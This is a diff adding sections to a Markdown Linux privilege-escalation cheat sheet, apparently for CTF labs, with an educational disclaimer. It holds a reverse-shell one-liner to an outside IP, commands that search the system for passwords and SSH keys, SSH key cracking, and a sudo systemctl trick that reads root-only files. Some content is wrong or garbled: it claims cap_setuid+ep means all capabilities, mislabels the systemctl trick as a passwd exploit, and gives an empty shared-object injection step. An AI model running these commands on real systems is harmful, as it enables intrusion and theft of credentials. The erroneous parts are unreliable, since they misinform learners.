@@ -110,6 +110,102 @@ echo "bash -c 'bash -i >& /dev/tcp/10.17.88.198/1234 0>&1'" > root.sh
 sudo ssh2john idrsa.id_rsa > id_rsa.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
 ```
+
+## User Enumeration
+To list all users on the system:
+```sh
+cat /etc/passwd | cut -d : -f 1
+```
+
+## Searching for Passwords
+To find all instances of "PASSWORD=" in files across the system:
+```sh
+grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null
+```
+
+To search for filenames containing the word "password":
+```sh
+locate password | more
+```
+
+## Finding SSH Keys
+To find all `id_rsa` files on the system:
+```sh
+find / -name id_rsa 2>/dev/null
+```
+
+## Using SSH Keys
+If you find an `id_rsa` key, save it to a file:
+```sh
+chmod 600 id_rsa
+ssh -i id_rsa root@<ip-address>
+```
+
+## Finding SUID Permissions
+To check the permissions of `/usr/bin/chsh`:
+```sh
+ls -la /usr/bin/chsh
+```
+
+## Exploiting `/usr/bin/passwd` with systemctl (GTFOBins)
+1. Create a temporary service file:
+    ```sh
+    TF=$(mktemp).service
+    ```
+
+2. Write the service file:
+    ```sh
+    echo '[Service]
+    ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+    [Install]
+    WantedBy=multi-user.target' > $TF
+    ```
+
+3. Link the service file:
+    ```sh
+    sudo systemctl link $TF
+    ```
+
+4. Enable and start the service:
+    ```sh
+    sudo systemctl enable --now $TF
+    ```
+
+5. Check the output:
+    ```sh
+    cat /tmp/output
+    ```
+
+## Shared Object Injection
+To find files with SUID and SGID bit set:
+```sh
+find / -perm -4000 -o -perm -2000 -exec ls -ld {} \; 2>/dev/null
+```
+If you find a binary like `/usr/local/bin/suid-so` with `rwsr-sr-x` permissions, it indicates that SUID and SGID bits are set.
+
+## Checking Capabilities
+To list all files with capabilities set:
+```sh
+getcap -r / 2>/dev/null
+```
+
+For example, if you find `/usr/bin/python2.6 = cap_setuid+ep`, it means all capabilities are enabled for this binary.
+
+## Using Hashcat
+To identify hash types, use:
+```sh
+hashcat --example-hashes
+```
+
+For specific hash types, refer to the [Hashcat documentation](https://hashcat.net/wiki/doku.php?id=example_hashes).
+
+## Exploiting SUID with Shared Object Injection
+To exploit a binary like `/usr/local/bin/suid-so`, you can use shared object injection if it’s vulnerable. Check permissions and capabilities to ensure the binary is exploitable.
+```sh
+./usr/local/bin/suid-so
+```
+```
+
 ### Disclaimer 🚨
 
 ⚠️ **Disclaimer:** The above content is not owned by me. It has been sourced from the internet for educational purposes only. I do not claim ownership or responsibility for the content provided. Please use it responsibly and in accordance with applicable laws and ethical guidelines.
